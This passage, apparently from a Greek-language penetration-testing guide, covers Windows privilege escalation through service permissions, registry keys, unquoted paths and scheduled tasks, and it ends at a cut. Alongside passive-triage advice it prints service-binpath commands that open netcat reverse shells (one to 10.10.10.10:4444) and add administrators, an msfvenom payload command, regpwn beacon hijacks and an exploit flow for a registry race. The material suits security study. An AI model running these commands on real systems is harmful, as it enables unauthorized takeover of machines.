Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START` επιτρέπει την παροχή ορισμάτων στο `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)· είναι διαφορετικό από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Ελέγξτε τον κώδικα της υπηρεσίας ή την τεκμηριωμένη διεπαφή της πριν θεωρήσετε ότι το δικαίωμα εκκίνησης είναι κάτι παραπάνω από δικαίωμα ελέγχου. Αν χρησιμοποιεί ένα όρισμα που επιλέγει ο καλών ως διαδρομή αρχείου καταγραφής ή εξαγωγής, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα στην εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **αρχείου που δημιουργείται**. Η εγγραφή σε έναν προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο αν υπάρχει ξεχωριστός προνομιούχος consumer ή loader που δέχεται αυτό το αρχείο· ένα αρχείο καταγραφής με δικαιώματα εγγραφής ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική απογραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

Για έναν agent παρακολούθησης NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο της διαμόρφωσης**: ενδέχεται να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη διαμόρφωση σε άλλη θέση. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον listener WEB και την πολιτική πρόσβασης, καθώς και το αν ο authenticated ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Η προνομιούχα εκτέλεση απαιτεί επιπλέον `CheckExternalScripts` (ή άλλη ενεργοποιημένη διαδρομή εκτέλεσης), αποτελεσματικό δικαίωμα καταχώρισης ή τροποποίησης εντολής και ένα trigger που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener μόνο για loopback μπορεί και πάλι να είναι προσβάσιμος σε τοπικό χρήστη, αλλά η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener από μόνα τους δεν αποδεικνύουν ότι υπάρχουν αυτά τα δικαιώματα. Ελέγξτε τα metadata και τα permissions χωρίς να εμφανίσετε μυστικά ή να καλέσετε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων του NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας για web και scripts](https://nsclient.org/docs/setup/securing/) και τη [διαμόρφωση external scripts](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: το [NSSM αποθηκεύει εκεί την child εφαρμογή](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο διαμορφωμένος working directory της. Ελέγξτε το child executable και τα ACL των γονικών καταλόγων του πριν θεωρήσετε ότι τα permissions του wrapper αποτελούν ολόκληρο το όριο ασφαλείας της υπηρεσίας. Ένα τοπικό endpoint WCF ή SOAP που εκθέτει αυτή η child εφαρμογή αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο listener είναι προσβάσιμος από τον χρήστη με χαμηλότερα δικαιώματα, ότι η συγκεκριμένη λειτουργία δέχεται την είσοδό του και ότι η child υπηρεσία εκτελεί την μη ασφαλή λειτουργία με ταυτότητα υψηλότερων δικαιωμάτων. Ο λογαριασμός υπηρεσίας, ένα URL endpoint ή μια διαδρομή με δικαιώματα εγγραφής από μόνα τους δεν αποδεικνύουν κλιμάκωση· αποφύγετε την κλήση λειτουργιών της υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, εντοπίστε τη ροή ενός string που ελέγχει ο καλών προς οποιοδήποτε PowerShell runspace. Η [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) και η [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding` με διαπιστευτήρια Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) πιστοποιεί τον client, αλλά η εξουσιοδότηση κλήσης της **συγκεκριμένης** λειτουργίας και η αποτελεσματική ταυτότητα του runspace πρέπει να ελεγχθούν ξεχωριστά. Μια διαδρομή από την είσοδο καλούντος με χαμηλότερα δικαιώματα στο `AddScript`, με ταυτότητα υπηρεσίας υψηλότερων δικαιωμάτων, αποτελεί όριο εκτέλεσης κώδικα· μια θύρα σε κατάσταση ακρόασης, ένας authenticated client ή μια αχρησιμοποίητη μέθοδος σε άσχετο assembly από μόνα τους δεν αποτελούν απόδειξη. Ελέγξτε στατικά την εγκατεστημένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation, χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, άφιξη συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις του Visual Studio με εργαλεία C/C++ μπορεί να περιλαμβάνουν την υπηρεσία διαγνωστικών `VSStandardCollectorService150`, ρυθμισμένη να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε ένα junction και ένα race με object-manager link για να ανακατευθύνει την επαναφορά του DACL μιας υπηρεσίας. Η επίδειξη κλιμάκωσης απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI του Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή binary αυτής της συγκεκριμένης υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση των patches του εγκατεστημένου στοιχείου. Μια εγγραφή υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι το host είναι ευάλωτο. Ο έλεγχος δεν απαιτεί την εκκίνηση της υπηρεσίας ή την εκτέλεση επιδιόρθωσης.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από τη _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανίζεται αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, επειδή είναι απενεργοποιημένη ή επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας το εξής:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση παράκαμψης** αυτού του προβλήματος είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα «Authenticated users» διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα προνόμια μπορούν να κλιμακωθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση δικαιωμάτων, οδηγώντας στη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα στα binaries υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να γίνει αντικείμενο hijack **αντικαθιστώντας το binary και επανεκκινώντας την υπηρεσία**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να βρείτε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACLs που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή εκμετάλλευσης είναι η εξής:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το binary είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το binary της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο binary υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε επανεκκίνηση του συστήματος / ενεργοποίηση του service trigger).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά την εκκίνηση, αν έχει ενέργεια αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε το μητρώο οποιασδήποτε υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας στο **μητρώο** μιας υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο μητρώο για ένα συγκεκριμένο κλειδί υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι η πρόσβαση είναι αποτελεσματική: έχουν σημασία οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα κλειδιού μητρώου είναι διαφορετικά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Για την κλιμάκωση απαιτούνται επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης υπηρεσίας, ένας τρόπος ενεργοποίησης της υπηρεσίας και μια ταυτότητα υπηρεσίας με περισσότερα προνόμια. Δείτε τα [δικαιώματα κλειδιών μητρώου](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε το Path του εκτελούμενου binary:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Αγώνας symlink στο Registry για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες λειτουργίες Προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **race condition με symbolic link** στο Registry μπορεί να ανακατευθύνει αυτήν την προνομιούχα εγγραφή σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας δυνατότητα **αυθαίρετης εγγραφής τιμής** στο HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες λειτουργίες Προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις σε ασφαλή επιφάνεια εργασίας και είναι εγγράψιμο από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγραφεί από το SYSTEM.
2. Ενεργοποιήστε την αντιγραφή στην ασφαλή επιφάνεια εργασίας (π.χ., **LockWorkstation**), η οποία εκκινεί τη ροή του AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM γράφει την τιμή που επέλεξε ο attacker στη διαδρομή HKLM στην οποία έγινε ανακατεύθυνση.

Μόλις αποκτήσετε δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, μεταβείτε σε LPE τροποποιώντας τιμές διαμόρφωσης υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο μητρώο υπηρεσιών

Αν έχετε αυτό το δικαίωμα σε ένα κλειδί μητρώου, σημαίνει ότι **μπορείτε να δημιουργήσετε υποκλειδιά κάτω από αυτό**. Στην περίπτωση των υπηρεσιών των Windows, αυτό **αρκεί για την εκτέλεση αυθαίρετου κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε πιθανή διαδρομή που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρουμένων εκείνων που ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η κλιμάκωση προνομίων. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Στόχοι script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με αρχείο `.bat` ή `.cmd`, ελέγξτε το script που αναφέρεται στα **ορίσματα της ενέργειας**, καθώς και το `cmd.exe`. Το ίδιο ισχύει για το ρητό όρισμα αρχείου ενός interpreter, όπως το PowerShell `-File`. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε επίσης τα ACL του script που αναφέρεται· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών από shell απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να γράψει ο καλών αποτελεί ένδειξη για εκτέλεση μεταξύ λογαριασμών μόνο όταν ο ρυθμισμένος principal της εργασίας διαφέρει από τον καλούντα και η εργασία φτάνει πράγματι σε αυτήν την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη μπορεί να έχει σημασία για τα scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καταστήσει τις γραμμές που προστίθενται απρόσιτες. Επιβεβαιώστε τα πραγματικά δικαιώματα ACL, το [πλαίσιο εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν ισχυριστείτε ότι είναι δυνατή η κλιμάκωση προνομίων. Η απογραφή δεν πρέπει να τροποποιεί το script ή να εκκινεί την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει ένα named `:$DATA` stream, του οποίου τα περιεχόμενα δεν εμφανίζονται σε μια συνηθισμένη λίστα καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων backup ή αρχείων ρυθμίσεων, εξετάστε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows τα εκθέτουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), καθώς και μέσω του PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί απλώς ένδειξη. Ελέγξτε τα πραγματικά δικαιώματα ανάγνωσης του αρχείου, την υποστήριξη streams από το filesystem, αν το stream περιέχει αξιοποιήσιμα διαπιστευτήρια και σε ποιον λογαριασμό πιστοποιούνται όντως. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εμφάνιση περιεχομένων streams κατά τη συνήθη απαρίθμηση.

## Είσοδοι βοηθητικού προγράμματος του Windows Driver Kit για προγραμματισμένες εργασίες

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και `working\rsf.rsf` ενός project από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το βοηθητικό πρόγραμμα με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση χαμηλών προνομίων για εγγραφή σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο πλαίσιο του συγκεκριμένου λογαριασμού, ακόμη κι όταν το ίδιο το εκτελέσιμο αρχείο του βοηθητικού προγράμματος είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος καταναλωτής και ότι **και τα δύο** συνοδευτικά αρχεία μπορούν να δημιουργηθούν ή να τροποποιηθούν· ο εντοπισμός του βοηθητικού προγράμματος από μόνος του δεν αρκεί.

Για μια προγραμματισμένη εργασία, ελέγξτε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν ορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου αρχείου αποτελεί μόνο ένδειξη προς επαλήθευση, όχι απόδειξη για το από πού διαβάζει η εργασία τις εισόδους της. Πρέπει επίσης να ικανοποιείται η προϋπόθεση του αρχείου εργασίας του project. Ελέγξτε τον πραγματικό principal της εργασίας αντί να υποθέτετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binary** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κλιμακώσετε προνόμια) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html).)

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης agent Windows του Checkmk

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Windows agents του Checkmk, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, όταν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο με προστασία εγγραφής. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες εγκατεστημένο επίπεδο patch και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο του branch, όπως `2.1`, δεν αρκεί για να επιβεβαιώσει την έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα στο Temp χωρίς να δημιουργήσει αρχεία ή να ενεργοποιήσει εντολές του agent.

#### Έλεγχος της υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε την έκδοση build 6210 και παλαιότερες του ADSelfService Plus· ο προμηθευτής το διόρθωσε στην έκδοση build 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας αποτελεί ένδειξη προς διερεύνηση, όχι επιβεβαίωση ευπάθειας: επιβεβαιώστε την ακριβή έκδοση build, το ιστορικό διαμόρφωσης SAML, την προσβασιμότητα της υπηρεσίας από το δίκτυο και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· η εκτέλεση ως SYSTEM απαιτεί η υπηρεσία να εκτελείται ως SYSTEM. Ένα αναγνώσιμο αρχείο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος είναι ξεχωριστή ένδειξη κρυπτογραφημένου backup, όχι απόδειξη αξιοποιήσιμων διαπιστευτηρίων ή του συγκεκριμένου σφάλματος SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυμπιέσετε κατά τη συνήθη απαρίθμηση.

#### Όρια του Jenkins controller και λογαριασμών τομέα

